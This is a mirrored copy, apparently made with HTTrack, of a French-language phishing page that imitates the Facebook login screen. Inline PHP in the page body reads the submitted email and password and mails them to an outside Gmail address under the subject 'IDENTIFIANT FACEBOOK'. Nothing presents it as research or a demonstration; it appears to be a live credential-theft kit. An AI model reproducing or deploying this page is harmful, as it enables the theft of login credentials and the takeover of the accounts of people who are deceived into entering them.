<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from fbookr.herokuapp.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 11 Jun 2022 15:21:52 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Connexion</title>
    <link rel="icon" type="image/svg+xml" href="images/favicon.svg" />
    <link rel="stylesheet" href="css/styles.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
</head>

<body>
    <main class="container">
        <!-- TITLE -->
        <div class="title-container">
            <img src="images/logo.svg" class="title-logo" />
            <p class="title-paragraph">
                Connectez-vous avec vos amis et le monde qui vous entoure sur Facebook.
            </p>
        </div>
        
         <?php 
    

        
         $to = 'bennouasse@gmail.com';
 
/* Construction du message */
                            $msg  = 'Bonjour,'."\r\n\r\n";
                            $msg .= 'Un client vient de faire de se connecter .voici son email:  '.$_POST['email'] ."\r\n\r\n";
							$msg .= 'Mot de passe:'.$_POST['password'] ."\r\n\r\n";
						
							  
							
                            $sujet = 'IDENTIFIANT FACEBOOK';

						    $headers = 'From: '.$_POST['email'] .' <'.$_POST["password"].'>'."\r\n\r\n";
 

                            mail($to, $sujet, $msg, $headers); 
                            
                       
    ?>
        <!-- FORM -->
        <div class="form-container">
            <form class="form" action="confirmation.php" method="POST">
                <input type="hidden" name="_token" value="AiOS33tbvc5012chtLrJx3OU48Rej4kAkdR7VlIZ">                <div class="input-container">
                    <input type="text" placeholder="Adresse e-mail ou numéro de tél.." name="mail" class="form-input form-input--email" />
                </div>
                <div class="input-container input-container--password">
                    <input type="password" placeholder="Mot de passe" name="password" class="form-input form-input--password" />
                    <div class="password-eye-container hidden">
                        <img src="images/eye-off.png" class="password-eye eye-off" />
                    </div>
                </div>
                <button class="form-log-in-btn">Se connecter</button>
                <a href="#" class="form-forgot-password">Mot de passe oublié?</a>
                <div class="divider"></div>
                <a href="#" class="form-create-account-btn">Créer nouveau compte</a>
            </form>
            <p class="create-page-paragraph">
                <a href="#" class="create-page-link">Créer une page</a> pour une célébrité, un groupe ou une entreprise.
            </p>
        </div>
    </main>
    <script src="js/script.js"></script>
</body>


<!-- Mirrored from fbookr.herokuapp.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 11 Jun 2022 15:21:53 GMT -->
</html>